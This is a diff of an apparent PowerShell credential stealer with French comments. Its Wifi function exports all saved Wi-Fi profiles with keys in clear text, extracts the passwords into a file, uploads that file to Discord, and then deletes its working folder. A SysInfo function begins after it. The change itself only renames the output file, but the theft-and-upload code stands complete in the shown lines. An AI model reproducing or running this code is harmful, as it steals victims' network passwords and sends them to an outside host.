@@ -81,13 +81,13 @@ function Wifi {
     # Exporte les profils Wi-Fi
     netsh wlan export profile key=clear
 
-    # Modifie les chemins dans le fichier et sauvegarde le résultat dans wifi.txt
+    # Modifie les chemins dans le fichier et sauvegarde le résultat dans Wifi_Passwords.txt
     Select-String -Path *.xml -Pattern 'keyMaterial' | ForEach-Object {
         $_ -replace '</?keyMaterial>', '' -replace "C:\\Users\\$env:UserName\\Desktop\\", '' -replace '.xml:22:', ''
-    } | Out-File -FilePath "wifi.txt" -Encoding utf8
+    } | Out-File -FilePath "Wifi_Passwords.txt" -Encoding utf8
 
-    # Charge le fichier wifi.txt sur Discord
-    Upload-Discord -file "wifi.txt" -text "Wifi password :"
+    # Charge le fichier Wifi_Passwords.txt sur Discord
+    Upload-Discord -file "Wifi_Passwords.txt" -text "Wifi password :"
 
     # Retourne au dossier temporaire C:\temp
     Set-Location -Path "C:\temp"
@@ -95,6 +95,7 @@ function Wifi {
     # Supprime le dossier temporaire wifi
     Remove-Item -Path "C:\temp\wifi" -Force -Recurse
 }
+
 
 function SysInfo {
     # Get desktop path
